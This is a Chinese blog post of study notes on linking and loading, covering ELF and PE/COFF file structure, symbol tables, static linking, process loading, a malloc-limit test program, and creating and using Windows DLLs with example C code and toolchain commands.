<h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><p>描述了文件基本属性，包括ELF文件版本、目标机器型号、程序入口地址等<br><strong>命令：</strong> <code>readelf -h simple.o</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935279-f2cda133-6299-4d3d-a0ed-6f9e38744fa5.png" alt><br>可以看到，ELF文件头中定义了：ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表位置和长度、段的数量等。</p>
<hr>
<p>ELF有32位和64位版本，它们的文件头内容是一样的，只不过有些成员的大小不一样。ELF文件头结构及相关常数被定义在<code>/usr/include/elf.h</code> ，其中自定义了一些类型<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935382-8826d20c-94e0-4c63-8cfa-a6a81cbd82a4.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935552-24d6459e-e7ff-4b0b-97fb-2601ea2f58f7.png" alt></p>
<hr>
<p>Elf32_Ehdr结构体中定义的成员含义为<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935648-f724c422-c6a2-46e9-95c0-d3ae7678f9ae.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935867-a5001f50-f9b6-4b4e-b8b0-aae2fbc05b6d.png" alt></p>
<h5 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h5><p>前四个字节是所有ELF文件都必须相同的标识码<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936044-404e1802-1f2c-4606-9e87-c2eb8561149c.png" alt><br>字节序和ELF版本的规定<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936120-20f9baa2-8f05-4e52-aa56-7a8f089faddd.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936199-ad0f67a4-ab29-4083-9e42-af6fa6555cbc.png" alt></p>
<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936291-c8ac480c-f12e-44c3-a3fd-84a4447f2e03.png" alt><br>e<em>type成员表示ELF文件类型，每个文件类型对应一个常量，系统通过这个常量来判断ELF的真正文件类型，而不是通过扩展名。相关常量以“EL</em>”开头<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936378-d16f743e-fc85-4391-8af9-df1ba87a0364.png" alt></p>
<h4 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h4><p>段表位置由ELF文件头中的e_shoff决定，这里的712是十进制<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936507-8ed26723-7152-4316-8190-3dcc498866ab.png" alt><br><strong>查看命令：</strong> <code>readelf -S hello.o</code>（注意objdump会省略辅助性的段，readelf查看的才是真正的段结构）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936597-c2a5170f-88da-4246-93b7-0da784b868ec.png" alt></p>
<h5 id="段描述符Elf32-Shdr"><a href="#段描述符Elf32-Shdr" class="headerlink" title="段描述符Elf32_Shdr"></a>段描述符Elf32_Shdr</h5><p>段表的结构是一个以Elf32_Shdr结构体为元素的数组，对于以上hello.o就是有13个元素的数组。其中第一个元素是无效的，所以共有12个有效的段<br>Elf32_Shdr的结构同样在<code>/usr/include/elf.h</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936714-33128f74-8239-4328-b909-85d89a7d997a.png" alt><br>各个成员的含义<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936804-4f5ff992-41e5-40c4-9936-6e776263a396.png" alt></p>
<h3 id="链接的接口——符号"><a href="#链接的接口——符号" class="headerlink" title="链接的接口——符号"></a>链接的接口——符号</h3><p>在链接中，将函数和变量统称为<strong>符号</strong>，函数名和变量名就是符号名。每个目标文件都有一个响应的符号表，每个符号有对应的符号值，对于变量和函数来说，符号值就是它们的地址。<br><code>nm hello.o</code>可以查看ELF文件的符号表<br><code>readelf -s hello.o</code>可以查看更详细额符号信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936973-4919b95f-51ad-43b0-8954-ea8304cbc0f4.png" alt><br>其中，Value为符号值（函数相对于代码段起始位置的偏移量），Size为符号大小（函数指令所占的字节数），Type和Bind为符号类型和绑定信息，Ndx为符号所在段。<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937064-d85f928c-ded0-42de-afbb-2b76b9770bab.png" alt></p>
<h4 id="C-符号修饰"><a href="#C-符号修饰" class="headerlink" title="C++符号修饰"></a>C++符号修饰</h4><p>区别重载的函数+防止静态变量冲突</p>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><p>Linux版本的gcc对extern “C”里面的符号不做修饰，可以利用声明一个与CPP中某些符号修饰结果相同的外部符号，直接获取其对应的值</p>
<h2 id="第四章-静态链接"><a href="#第四章-静态链接" class="headerlink" title="第四章 静态链接"></a>第四章 静态链接</h2><h3 id="空间地址分配"><a href="#空间地址分配" class="headerlink" title="空间地址分配"></a>空间地址分配</h3><p>我们输入多个目标文件，链接器怎么将它们的各个段合并到输出文件？或者说，输出文件中的空间如何分配给输入文件？</p>
<h4 id="按序叠加"><a href="#按序叠加" class="headerlink" title="按序叠加"></a>按序叠加</h4><p>存在的问题：输出文件会有很多零散的段，造成内存空间大量的内存碎片。</p>
<h4 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h4><p>问：这里的<strong>空间分配</strong>是指什么空间？<br>答：虚拟地址空间的分配</p>
<hr>
<p><strong>链接器空间分配的基本策略：</strong> （两步链接）</p>
<ol>
<li>空间与地址分配</li>
<li>符号解析与<strong>重定位</strong> （核心）</li>
</ol>
<hr>
<p><strong>命令：</strong></p>
<ol>
<li><code>ld a.o b.o -e main -o ab</code> -e表示将main作为程序入口，ld默认入口为_start，<code>-o ab</code>  表示链接输出文件名为ab，默认为a.out</li>
<li><code>objdump -h filename</code> 可查看链接前后地址的分配情况</li>
</ol>
<p><strong>VMA：</strong> Virtual Memory Address虚拟地址</p>
<h4 id="确定符号地址"><a href="#确定符号地址" class="headerlink" title="确定符号地址"></a>确定符号地址</h4><p>链接器进行空间地址分配后，各个段的虚拟地址就确定了，链接器开始计算每个符号的虚拟地址。</p>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>如果.text有要被重定位的地方，会有一个相对应的.rel.text；如果.data又要被重定位的地方，就会有一个.re.data保存数据段的重定位表。每个要被重定位的地方叫一个重定位入口<br><code>objdump -r a.o</code> 查看目标文件的重定位表</p>
<h4 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h4><p>重定位过程中，每个重定位入口都是对一个符号的引用，当链接器需要对某个符号的引用进行重定位时，它就要确定这个符号的目标地址。链接器就会查找所有输入目标文件的符号表组成的全局符号表，找到对应的符号后进行重定位。</p>
<h4 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h4><p>对于32位x86平台下的ELF文件的重定位入口所修正的指令寻址方式只有两种：<strong>绝对近址32位寻址、相对近址32位寻址</strong>。<br>区别：绝对寻址修正后的地址为该符号的实际地址，相对寻址修正后的地址是符号距离被修正位置的<strong>地址差</strong>。</p>
<h3 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h3><p>拓展：这种机制最早来源于Fortran，早期Fortran没有动态分配空间的机制，程序员必须声明它所需要的临时使用空间的大小。这种空间就是COMMON块，当不同的目标文件需要的COMMON块大小不一致时，以最大的那块为准。COMMON块可以应对一个弱符号定义在多个目标文件中，而它们类型又不同的情况。<br>一旦一个未初始化的全局变量不是以COMMON块的形式存在时，那么它就相当于一个强符号，如果其他目标文件中还有同一个变量的强符号定义，链接时就会发生符号重复定义的错误。</p>
<h3 id="C-问题"><a href="#C-问题" class="headerlink" title="C++问题"></a>C++问题</h3><ol>
<li>重复代码消除</li>
<li>全局构造与析构</li>
</ol>
<h4 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a>重复代码消除</h4><p>模板、外部内联函数、虚函数表都有可能在不同的编译单元里产生相同的代码<br>方法：将每个模板的实例代码都单独存放到一个段里，每个段只包含一个模板实例。但是相同名称的段可能拥有不同的内容，导致编译出来的实际代码有所不同，这种情况，链接器随意选择一个副本作为链接的输入。<br><strong>函数级别链接：</strong> 让所有函数像上文提到的模板函数那样单独保存到一个段，链接器需要某个函数就合并到输出文件，对于没有用的函数则抛弃。</p>
<h4 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h4><p>全局对象的构造函数在main函数之前被执行，全局对象的析构函数在main之后执行<br>ELF文件两个特殊的段：.init（进程的初始化代码，main以前执行）和.fini（进程终止代码指令，main以后执行）</p>
<h3 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h3><ol>
<li>列举静态库文件libc.a中的目标文件 <code>ar -t libc.a</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937245-46fa386c-3933-4432-aa95-5ebbbf5155d1.png" alt></li>
<li>找到printf所在的目标文件 <code>objdump -t libc.a</code></li>
</ol>
<p><code>gcc -c -fno-builtin hello.c</code> -fno-builtin 关闭内置函数优化<br><code>gcc -static --verbose -fno-builtin hello.c</code> -verbose 将编译链接的中间步骤打印出来<br>问：为什么静态运行库里一个目标文件只包含一个函数？<br>答：如果很多函数放在一个目标文件中，很多没用的函数也会被链接到输出结果中，造成空间的浪费。</p>
<h3 id="链接过程控制"><a href="#链接过程控制" class="headerlink" title="链接过程控制"></a>链接过程控制</h3><p>Windows操作系统内核：C:\Windows\System32\ntoskrnl.exe<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937341-746c1000-2509-4c12-8c12-e0bab2877fc7.png" alt></p>
<h4 id="连接控制脚本"><a href="#连接控制脚本" class="headerlink" title="连接控制脚本"></a>连接控制脚本</h4><p><code>ld -verbose</code> 查看ld默认的链接脚本<br><code>ld -T link.script</code> 指定自己写的脚本为链接控制脚本</p>
<h2 id="第五章-Windows-PE-COFF"><a href="#第五章-Windows-PE-COFF" class="headerlink" title="第五章 Windows PE/COFF"></a>第五章 Windows PE/COFF</h2><p>PE/COFF文件与ELF文件非常相似，它们都是基于段的结构的二进制文件格式。Windows下最常见的目标文件格式就是COFF格式。<br>COFF文件有一个.drectve段，其中保存编译器传递给链接器的命令行参数，可以通过这个段实现指定运行库等功能。<br>Windows下的可执行文件、动态链接库等都使用PE文件格式，PE文件格式是COFF文件格式的改进版本，增加了PE文件头、数据目录等结构。</p>
<h2 id="第三部分-装载与动态链接"><a href="#第三部分-装载与动态链接" class="headerlink" title="第三部分 装载与动态链接"></a>第三部分 装载与动态链接</h2><h2 id="第六章-可执行文件的装载与进程"><a href="#第六章-可执行文件的装载与进程" class="headerlink" title="第六章 可执行文件的装载与进程"></a>第六章 可执行文件的装载与进程</h2><h3 id="进程与程序的区别"><a href="#进程与程序的区别" class="headerlink" title="进程与程序的区别"></a>进程与程序的区别</h3><p>程序是一个静态的概念，就是一些预先编译好的指令和数据集合的一个文件；进程是一个动态的概念，是程序运行时的一个过程。<br>程序像菜谱，进程像做菜的过程。</p>
<h3 id="PAE-（Physical-Address-Extension）"><a href="#PAE-（Physical-Address-Extension）" class="headerlink" title="PAE （Physical Address Extension）"></a>PAE （Physical Address Extension）</h3><p>32位的CPU，程序使用的虚拟地址空间不能超过4GB；计算机的内存空间是可以超过的，通过PAE可以完成。<br>应用程序如何使用这些大于常规的内存空间？<br><strong>窗口映射</strong>：把额外的内存映射到进程地址空间。<br>举例：比如32位CPU，有一个应用程序用一段256MB的虚拟地址空间做窗口，程序可以从高于4GB的物理空间中申请多个256MB的物理空间，编号成ABC，然后根据需要将窗口映射到不同的物理空间块，用到A的时候就把窗口映射到A，用到B就映射过去，如此重复。<br>Windows下这种访问内存的操作是AWE（Address Windowing Extension）；<br>Linux下采用mmap()系统调用实现。</p>
<h3 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h3><p>静态装载方法：将程序运行所需要的指令和数据全都装入内存。<br>动态装入：将程序最常用的部分留在内存，不太常用的部分存在磁盘。这样可以更有效的利用内存<br>典型的动态装载方法：<strong>覆盖装入</strong>（Overlay）和<strong>页映射</strong>（Paging）。原则上都是利用了程序的局部性原理。<br>覆盖装入已经几乎被淘汰了，其基本原理就是将有依赖关系的A和B内存覆盖，形成共享块内存区域，调用谁，覆盖管理器就把谁读入内存。<br>页映射是将内存和所有磁盘中的数据和指令按照页为单位进行划分，以后装在和操作的单位就是页。</p>
<h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><ol>
<li><strong>创建一个虚拟地址空间：</strong> 虚拟空间由一组页映射函数将虚拟空间的各个页映射到响应的物理空间，所以创建虚拟空间实际上不是创建空间，而是创建映射函数所需要的数据结构。</li>
<li><strong>读取可执行文件头，建立虚拟空间与可执行文件的映射关系</strong></li>
<li><strong>将CPU指令寄存器设置成可执行文件入口，启动运行：</strong> 可以认为操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址。（ELF文件头保存有入口地址）</li>
</ol>
<h3 id="section-和-segment"><a href="#section-和-segment" class="headerlink" title="section 和 segment"></a>section 和 segment</h3><p>从链接的角度看，ELF文件按Section存储<br>从装载的角度看，ELF文件按Segment划分<br>ELF可执行文件和共享库文件有程序头表专门保存Segment。而ELF目标文件由于不需要装载，所以没有程序头表。</p>
<h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><p>堆和栈在进程的虚拟空间中也是以VMA（Virtual Memory Area虚拟内存区域）的形式存在</p>
<h4 id="进程虚拟地址空间小结"><a href="#进程虚拟地址空间小结" class="headerlink" title="进程虚拟地址空间小结"></a>进程虚拟地址空间小结</h4><ol>
<li>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间</li>
<li>基本原则是将相同权限属性的、有相同影像文件的映射成一个VMA</li>
<li>一个进程基本上可以分成4中VMA</li>
</ol>
<h4 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h4><ul>
<li>测试 malloc 最大内存申请量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> maximum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> blocksize[] = &#123; <span class="number">1024</span> * <span class="number">1024</span>,<span class="number">1024</span>,<span class="number">1</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> i, count;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (count = <span class="number">1</span>;; count++) &#123;</span><br><span class="line">			<span class="keyword">void</span>* block = <span class="built_in">malloc</span>(maximum + blocksize[i] * count);</span><br><span class="line">			<span class="keyword">if</span> (block) &#123;</span><br><span class="line">				maximum = maximum + blocksize[i] * count;</span><br><span class="line">				<span class="built_in">free</span>(block);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;maximum malloc size = %u bytes\n&quot;</span>, maximum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在我的 Linux 环境（64 位的虚拟机环境）下，结果大约是 2.8 GB  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836201223-444f74dd-6b41-4093-87ff-93d57e647f7b.png" alt="image.png"></p>
<ul>
<li>在我的 Windows 环境（64 位）下，结果大约是 1.8 GB</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836491880-d01a62c4-fd3d-4097-8689-b1ad5f9d2cd1.png" alt="image.png"></p>
<ul>
<li>影响 malloc 最大内存申请量的因素<ul>
<li>操作系统版本</li>
<li>程序本身大小</li>
<li>用到的动态/共享库数量、大小</li>
<li>程序栈数量、大小</li>
</ul>
</li>
</ul>
<h3 id="Linux-内核装载-ELF-的过程"><a href="#Linux-内核装载-ELF-的过程" class="headerlink" title="Linux 内核装载 ELF 的过程"></a>Linux 内核装载 ELF 的过程</h3><h4 id="1-用户层面"><a href="#1-用户层面" class="headerlink" title="1 用户层面"></a>1 用户层面</h4><ul>
<li>bash 进程调用 <code>fork()</code> 创建一个新的进程</li>
<li>新的进程调用 <code>execve()</code> 执行指定 ELF </li>
</ul>
<h4 id="2-内核层面"><a href="#2-内核层面" class="headerlink" title="2 内核层面"></a>2 内核层面</h4><p>进入 <code>execve()</code> 系统调用后</p>
<ul>
<li>内核中 <code>execve()</code> 入口是 <code>sys_execve()</code>，<code>sys_execve()</code> 进行一些参数的检查复制后，调用 <code>do_execve()</code> </li>
<li><code>do_execve()</code> 查找被执行的文件，并读取文件的前 128 个字节，判断文件格式。然后调用 <code>search_binary_handle()</code> 搜索合适的装载处理过程。</li>
<li>针对 ELF 的装载处理过程是 <code>load_elf_binary()</code> </li>
<li>装载处理完成后，返回至 <code>do_execve()</code> 再执行返回至 <code>sys_execve()</code> ，随即从内核态返回到用户态，EIP 寄存器直接跳转到 ELF 程序入口地址，新的程序开始执行，ELF 文件装载完成。</li>
</ul>
<h3 id="Windows-PE-的装载"><a href="#Windows-PE-的装载" class="headerlink" title="Windows PE 的装载"></a>Windows PE 的装载</h3><ul>
<li>读取文件的第一个页（其中包含 DOS 头，PE 文件头和段表）</li>
<li>检查进程地址空间中，目标地址是否可用，不可用则另选一个装载地址（针对 DLL）</li>
<li>使用段表提供的信息，将 PE 文件中所有的段一一映射到地址空间中相应的位置</li>
<li>如果装载地址不是目标地址，则 Rebasing</li>
<li>装载所有需要的 DLL</li>
<li>将 PE 文件中所有导入的符号进行符号解析</li>
<li>根据 PE 头中指定的参数，建立初始化栈和堆</li>
<li>建立主线程并启动进程</li>
</ul>
<h2 id="第九章-Windows-下的动态链接"><a href="#第九章-Windows-下的动态链接" class="headerlink" title="第九章 Windows 下的动态链接"></a>第九章 Windows 下的动态链接</h2><h3 id="9-1-DLL-简介"><a href="#9-1-DLL-简介" class="headerlink" title="9.1 DLL 简介"></a>9.1 DLL 简介</h3><p>DLL 即动态链接库 Dynamic-Link Library。</p>
<ul>
<li>DLL 与 ELF 的区别：ELF 中代码段是地址无关的，可以实现进程间共享一份代码；DLL 的代码不是地址无关的，只能在某些情况下可以被多个进程共享</li>
</ul>
<h4 id="9-1-1-如何创建DLL"><a href="#9-1-1-如何创建DLL" class="headerlink" title="9.1.1 如何创建DLL"></a>9.1.1 如何创建DLL</h4><ul>
<li>MSVC 编译器工具路径 C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64，可以在开始菜单进入 Command Prompt 使用 cl</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009002528-08db24aa-9b77-463c-881a-7e5a3c42b226.png" alt="img"></p>
<ul>
<li>Math.c 示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__declspec(dllexport) double Add(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Sub(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Mul(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cl /LDd Math.c</code> 生成 Debug 版的 DLL（/LD 是 Release 版的 DLL）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009060202-324978ed-f44d-42c9-bfc3-ca24b1335e34.png" alt="img"></p>
<ul>
<li>生成的 4 个文件默认输出到 C:\Windows\System32，其中 Math.dll 就是我们需要的文件</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009150490-b5805769-5f18-48a4-9b52-2c8a8551b5f8.png" alt="img"></p>
<ul>
<li><code>dumpbin /EXPORTS Math.dll</code> （dumpbin 工具和 cl 在同一目录）查看 DLL 的导出符号</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009490802-53309843-8d54-4191-b2dd-e0a9d0dec258.png" alt="img"></p>
<h4 id="9-1-2-如何使用-DLL"><a href="#9-1-2-如何使用-DLL" class="headerlink" title="9.1.2 如何使用 DLL"></a>9.1.2 如何使用 DLL</h4><h5 id="a-静态链接（dllimport-导入符号）"><a href="#a-静态链接（dllimport-导入符号）" class="headerlink" title="a. 静态链接（dllimport 导入符号）"></a>a. 静态链接（dllimport 导入符号）</h5><ul>
<li><code>__declspec(dllimport)</code> 显式声明某个符号为导入符号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">__declspec(dllimport) double Sub(double a, double b);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    double result = Sub(3.0, 2.0);</span><br><span class="line">    printf(&quot;Result = %f\n&quot;, result);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cl /c TestMath.c</code> 将 c 代码编译成 obj，注意 command prompt 输出默认都在 C:\Windows\System32</li>
<li><p><code>link TestMath.obj Math.lib</code> 使用链接器 TestMath.obj 和 Math.lib 链接在一起，生成 TestMath.exe 文件</p>
</li>
<li><p>Math.lib 装的是什么：其包含了 TestMath.o 链接 Math.dll 时所需的导入符号以及一部分“桩”代码（“胶水”代码），以便于将程序和 DLL 粘在一起。这样的 lib 文件又被称为<strong>导入库（Import Library）</strong></p>
</li>
<li><p>在命令行运行该文件，可以正常输出结果</p>
</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619010275975-b399b132-39b8-4da3-a527-06a1e32ba7eb.png" alt="img"></p>
<h5 id="b-运行时链接（LoadLibrary-运行时加载）"><a href="#b-运行时链接（LoadLibrary-运行时加载）" class="headerlink" title="b. 运行时链接（LoadLibrary 运行时加载）"></a>b. 运行时链接（LoadLibrary 运行时加载）</h5><ul>
<li>LoadLibrary 装载一个 DLL 到进程的地址空间</li>
<li><p>GetProcAddress 查找某个符号的地址</p>
</li>
<li><p>FreeLibrary 卸载已装载的模块</p>
</li>
<li>示例代码：runtimeLink.c</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef double (*Func) (double, double);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    Func function;</span><br><span class="line">    double result;</span><br><span class="line"></span><br><span class="line">    // Load DLL</span><br><span class="line">    HINSTANCE hinstLib = LoadLibrary(&quot;Math.dll&quot;);</span><br><span class="line">    if (hinstLib == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to load DLL\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Get function address</span><br><span class="line">    function = (Func)GetProcAddress(hinstLib, &quot;Add&quot;);</span><br><span class="line">    if (function == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to find DLL function\n&quot;);</span><br><span class="line">        FreeLibrary(hinstLib);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Call function</span><br><span class="line">    result = function(1.0, 2.0);</span><br><span class="line"></span><br><span class="line">    // Unload DLL file</span><br><span class="line">    FreeLibrary(hinstLib);</span><br><span class="line"></span><br><span class="line">    // Display result</span><br><span class="line">    printf(&quot;Result = % f\n&quot;, result);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译：<code>cl runtimeLink.c</code> ，得到 runtimeLink.exe ，在命令行运行结果如下。成功调用了 Math.dll 中的 Add 函数  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619092840542-0d0a4232-47e2-4caa-9e33-100368967b7a.png" alt="img"></p>
<h3 id="9-2-符号导入导出表"><a href="#9-2-符号导入导出表" class="headerlink" title="9.2 符号导入导出表"></a>9.2 符号导入导出表</h3><h4 id="9-2-1-导出表"><a href="#9-2-1-导出表" class="headerlink" title="9.2.1 导出表"></a>9.2.1 导出表</h4><h5 id="a-什么是导出表"><a href="#a-什么是导出表" class="headerlink" title="a. 什么是导出表"></a>a. 什么是导出表</h5><p>导出表集中了所有导出的符号，提供了符号名与符号地址的映射。</p>
<ul>
<li>路径：C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\um\winnt.h</li>
<li><p>导出表就是其中的 _IMAGE_EXPORT_DIRECTORY 结构体</p>
</li>
<li><p>最后三个成员指向三个重要数组，分别是 导出地址表（EAT，Export Address Table），符号名表（Name Table）和名字序号对应表（Name-Ordinal Table）</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<h5 id="b-怎么查看可以导出的函数"><a href="#b-怎么查看可以导出的函数" class="headerlink" title="b. 怎么查看可以导出的函数"></a>b. 怎么查看可以导出的函数</h5><ul>
<li><code>dumpbin /DIRECTIVES Math.obj</code></li>
</ul>
